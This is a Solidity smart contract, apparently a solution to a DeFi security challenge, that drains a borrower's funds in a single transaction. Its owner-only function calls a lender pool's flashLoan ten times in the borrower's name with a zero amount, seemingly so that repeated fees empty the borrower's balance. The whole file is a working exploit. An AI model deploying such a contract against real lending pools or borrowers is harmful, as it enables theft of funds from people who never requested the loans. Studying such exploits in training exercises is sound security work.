// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerBonusSingleTransaction {

    address private owner;
    address private lenderPool;

    constructor(address lenderPoolAddress)
    {
        owner=msg.sender;
        lenderPool=lenderPoolAddress;
    }

    function drainBorrowerFunds(address borrowerAddress) public {
        require(msg.sender==owner,"Only owner can call this function");

        //drain funds
        for(uint i=0;i<10;i++)
        {
            ILenderPool(lenderPool).flashLoan(borrowerAddress, 0 ether);
        }
    }
}
